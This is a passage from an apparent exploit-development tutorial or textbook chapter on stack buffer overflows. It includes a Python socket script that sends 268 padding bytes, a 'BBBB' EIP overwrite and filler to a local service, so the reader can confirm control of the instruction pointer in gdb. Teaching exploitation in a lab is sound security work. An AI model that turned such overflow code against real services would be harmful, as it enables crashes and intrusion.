information.

# Controlling EIP

Now we know how many characters have to be overwritten for control of EIP. We need to verify that we are correct. We do this by building our exploit string so that our original exploit characters up to A's, our EIP overwrite consists of B's, and the rest of our exploit buffer is made up of C's.

```
#!/usr/bin/python
import socket
s = socket.socket()
host = '127.0.0.1'
port = 8000
eip = "BBBB"
buf = "A"*268 + eip
buf += "C"*(1024-len(buf))
s.connect((host, port))
print s.recv(1024)
s.send(buf)
print s.recv(1024)
s.close
```

Our new code sets the EIP value to “BBBB” and then creates an exploit buffer of 268A characters, our EIP overwrite of B's and then finishes out our 1024 length buffer with C's. When we restart our program in gdb and run our new code, we should see output similar to Fig. 9.6.